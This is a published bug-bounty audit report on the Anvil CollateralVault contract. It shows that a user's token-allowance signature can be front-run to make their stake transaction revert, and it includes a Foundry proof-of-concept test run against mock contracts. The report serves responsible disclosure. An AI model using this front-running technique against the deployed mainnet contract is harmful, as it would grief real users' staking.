# #36475 \[SC-Medium] Token allowance signature can be front-run

**Submitted on Nov 3rd 2024 at 23:51:27 UTC by @zhuying for** [**Audit Comp | Anvil**](https://immunefi.com/audit-competition/audit-comp-anvil)

* **Report ID:** #36475
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://etherscan.io/address/0xd042C267758eDDf34B481E1F539d637e41db3e5a>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The token allowance signature is required when users want to stake to TimeBasedCollateralPool. However when user initiates the stake tx, anyone can front-run the signature and call \`modifyCollateralizableTokenAllowanceWithSignature\` function in CollateralVault.sol to let user's nonce increase. And the user's stake tx will revert becauser of invalid signature.

## Vulnerability Details

\`\`\` function modifyCollateralizableTokenAllowanceWithSignature( address \_accountAddress, address \_collateralizableContractAddress, address \_tokenAddress, int256 \_allowanceAdjustment, bytes calldata \_signature // @audit-issue signature can be front-run ) external { if (\_allowanceAdjustment > 0 && !collateralizableContracts\[\_collateralizableContractAddress]) { revert ContractNotApprovedByProtocol(\_collateralizableContractAddress); }

```
    _modifyCollateralizableTokenAllowanceWithSignature(
        _accountAddress, _collateralizableContractAddress, _tokenAddress, _allowanceAdjustment, _signature
    );
}
```

\`\`\` The parameter of \`modifyCollateralizableTokenAllowanceWithSignature\` function is inputted directly. Anyone which knows signature information can call this function to consume signature. The contracts are depolyed to mainnet. If user initiates a stake tx publicly, the tx message is open to anyone. Attacker can front-run stake tx to let user's stake tx revert.

## Impact Details

User's token allowance signature is useless if anyone front-runs the signature message.

## References

<https://github.com/AcronymFoundation/anvil-contracts/blob/1bbe04bb6f1aa1beea0ebf55e1bad67da3aa0f87/contracts/CollateralVault.sol#L294-L311>

## Link to Proof of Concept

<https://gist.github.com/psych2go/b596434b80f6ae5a9ad444a09bdab9b1>

## Proof of Concept

## Proof of Concept

\`\`\` // SPDX-License-Identifier: ISC pragma solidity 0.8.25;

import {Test} from "forge-std/Test.sol"; import {CollateralVault} from "../contracts/CollateralVault.sol"; import {TimeBasedCollateralPool} from "../contracts/TimeBasedCollateralPool.sol"; import {ICollateral} from "../contracts/interfaces/ICollateral.sol";

import {mockERC20} from "./mocks/mockERC20.sol";

contract SignatureFrontrun is Test { error InvalidSignature(address account);

```
CollateralVault vault;
TimeBasedCollateralPool pool;
mockERC20 token;

address owner &#x3D; makeAddr(&quot;owner&quot;);
address claimDestination &#x3D; makeAddr(&quot;claimDestination&quot;);
address user &#x3D; makeAddr(&quot;user&quot;);
address attacker &#x3D; makeAddr(&quot;attacker&quot;);
uint256 privateKey &#x3D; 0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef;
address signer &#x3D; vm.addr(privateKey);

bytes32 public constant COLLATERALIZABLE_TOKEN_ALLOWANCE_ADJUSTMENT_TYPEHASH &#x3D; keccak256(
    &quot;CollateralizableTokenAllowanceAdjustment(address collateralizableAddress,address tokenAddress,int256 allowanceAdjustment,uint256 approverNonce)&quot;
);
bytes32 public constant COLLATERALIZABLE_DEPOSIT_APPROVAL_TYPEHASH &#x3D; keccak256(
    &quot;CollateralizableDepositApproval(address collateralizableAddress,address tokenAddress,uint256 depositAmount,uint256 approverNonce)&quot;
);
bytes32 private constant TYPE_HASH &#x3D;
    keccak256(&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;);

uint256 per_hour &#x3D; 3600;
uint256 amount &#x3D; 1 ether;

function setUp() public {
    // depoly token contract
    token &#x3D; new mockERC20(&quot;Anvil&quot;, &quot;ANV&quot;);
    CollateralVault.CollateralTokenConfig[] memory config1 &#x3D; new CollateralVault.CollateralTokenConfig[](1);
    config1[0] &#x3D; CollateralVault.CollateralTokenConfig({enabled: true, tokenAddress: address(token)});
    vm.startPrank(owner);
    // depoly CollateralVault contract
    vault &#x3D; new CollateralVault(config1);
    // depoly TBCP contract
    pool &#x3D; new TimeBasedCollateralPool();
    pool.initialize(ICollateral(vault), per_hour, claimDestination, owner, address(0), address(0), address(0));
    CollateralVault.CollateralizableContractApprovalConfig[] memory config2 &#x3D;
        new CollateralVault.CollateralizableContractApprovalConfig[](1);
    config2[0] &#x3D; CollateralVault.CollateralizableContractApprovalConfig({
        collateralizableAddress: address(pool),
        isApproved: true
    });
    vault.upsertCollateralizableContractApprovals(config2);
    vm.stopPrank();
}

function testNormalCase() public {
    // 1.user deposits to signer
    vm.startPrank(user);
    token.mint(user, amount);
    token.approve(address(vault), amount);
    address[] memory tokenAddresses &#x3D; new address[](1);
    tokenAddresses[0] &#x3D; address(token);
    uint256[] memory amounts &#x3D; new uint256[](1);
    amounts[0] &#x3D; amount;
    vault.depositToAccount(signer, tokenAddresses, amounts);
    vm.stopPrank();
    // 2.signer signs message
    bytes32 messageHash &#x3D; toTypedDataHash(
        _buildDomainSeparator(),
        keccak256(
            abi.encode(
                COLLATERALIZABLE_TOKEN_ALLOWANCE_ADJUSTMENT_TYPEHASH, address(pool), address(token), 1 ether, 0
            )
        )
    );
    (uint8 v, bytes32 r, bytes32 s) &#x3D; vm.sign(privateKey, messageHash);
    bytes memory signature &#x3D; abi.encodePacked(r, s, v);
    // 3.signer calls stake function
    vm.startPrank(signer);
    pool.stake(token, amount, signature);
    vm.stopPrank();
}

function testSignatureFrontrun() public {
    // 1.user deposits to signer
    vm.startPrank(user);
    token.mint(user, amount);
    token.approve(address(vault), amount);
    address[] memory tokenAddresses &#x3D; new address[](1);
    tokenAddresses[0] &#x3D; address(token);
    uint256[] memory amounts &#x3D; new uint256[](1);
    amounts[0] &#x3D; amount;
    vault.depositToAccount(signer, tokenAddresses, amounts);
    vm.stopPrank();
    // 2.signer signs message
    bytes32 messageHash &#x3D; toTypedDataHash(
        _buildDomainSeparator(),
        keccak256(
            abi.encode(
                COLLATERALIZABLE_TOKEN_ALLOWANCE_ADJUSTMENT_TYPEHASH, address(pool), address(token), 1 ether, 0
            )
        )
    );
    (uint8 v, bytes32 r, bytes32 s) &#x3D; vm.sign(privateKey, messageHash);
    bytes memory signature &#x3D; abi.encodePacked(r, s, v);
    // 3.signer initiates tx
    /////////////////////////////////////////
    //vm.startPrank(signer);/////////////////
    //pool.stake(token, amount, signature);//
    //vm.stopPrank();////////////////////////
    /////////////////////////////////////////
    // 4.attacker front-runs the tx
    vm.startPrank(attacker);
    vault.modifyCollateralizableTokenAllowanceWithSignature(
        signer, address(pool), address(token), int256(amount), signature
    );
    vm.stopPrank();
    // 5.tx reverts
    vm.startPrank(signer);
    vm.expectRevert(abi.encodeWithSelector(InvalidSignature.selector, signer));
    pool.stake(token, amount, signature);
    vm.stopPrank();
}

// helper function for signature testing
function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32 digest) {
    assembly (&quot;memory-safe&quot;) {
        let ptr :&#x3D; mload(0x40)
        mstore(ptr, hex&quot;1901&quot;)
        mstore(add(ptr, 0x02), domainSeparator)
        mstore(add(ptr, 0x22), structHash)
        digest :&#x3D; keccak256(ptr, 0x42)
    }
}

// helper function for signature testing
function _buildDomainSeparator() private view returns (bytes32) {
    string memory name &#x3D; &quot;CollateralVault&quot;;
    string memory version &#x3D; &quot;1&quot;;
    bytes32 _hashedName &#x3D; keccak256(bytes(name));
    bytes32 _hashedVersion &#x3D; keccak256(bytes(version));
    return keccak256(abi.encode(TYPE_HASH, _hashedName, _hashedVersion, block.chainid, address(vault)));
}
```

} \`\`\`
